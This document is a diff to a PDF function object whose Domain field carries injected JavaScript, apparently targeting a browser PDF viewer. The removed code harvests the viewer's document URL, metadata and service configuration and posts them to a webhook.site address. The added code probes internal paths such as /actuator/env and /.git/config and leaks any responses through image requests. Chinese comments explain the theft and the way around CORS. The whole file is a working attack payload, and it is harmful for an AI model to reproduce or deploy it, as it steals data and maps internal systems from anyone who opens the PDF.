@@ -3,25 +3,26 @@
 <<
   /FunctionType 4
   /Domain [((function(){
-    var out = {};
-    try {
-        var app = window.PDFViewerApplication;
-        if (app) {
-            // 1. 获取当前 PDF 的实际 URL（可能包含未授权的内部路径、临时签名 Token）
-            out.url = app.url || app._docUrl;
-            // 2. 获取 PDF 的元数据（作者、创建工具、内部路径等）
-            if (app.metadata) out.metadata = app.metadata.info;
-            // 3. 获取内部配置（可能泄露 API 地址）
-            if (app.externalServices) out.extServices = app.externalServices;
-        }
-        
-        // 外带
+    // 尝试常见的内部接口、配置接口、调试接口
+    var paths = [
+        '/api/config', '/api/status', '/api/health', '/api/internal', 
+        '/api/debug', '/api/users', '/actuator/env', '/v2/api-docs', 
+        '/swagger-ui.html', '/.git/config', '/config.json', '/server-info'
+    ];
+    
+    paths.forEach(function(path){
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f/pdf_data', true);
-        xhr.send(JSON.stringify(out));
-    } catch(e) {
-        new Image().src = 'https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f/err?e=' + encodeURIComponent(e.message);
-    }
+        xhr.open('GET', path, true);
+        xhr.onload = function(){
+            // 如果接口存在且返回了非空内容（状态码 200，或者返回了一些特定文本）
+            if (xhr.status === 200 && xhr.responseText.length > 0) {
+                var resData = xhr.responseText.substring(0, 500); // 截取前500字符
+                // 用图片外带，避免跨域 XHR 的 CORS 限制
+                new Image().src = 'https://webhook.site/你的专属ID?path=' + encodeURIComponent(path) + '&data=' + encodeURIComponent(resData);
+            }
+        };
+        xhr.send();
+    });
 })();) 0]
   /Range [0 0]
   /Length 12
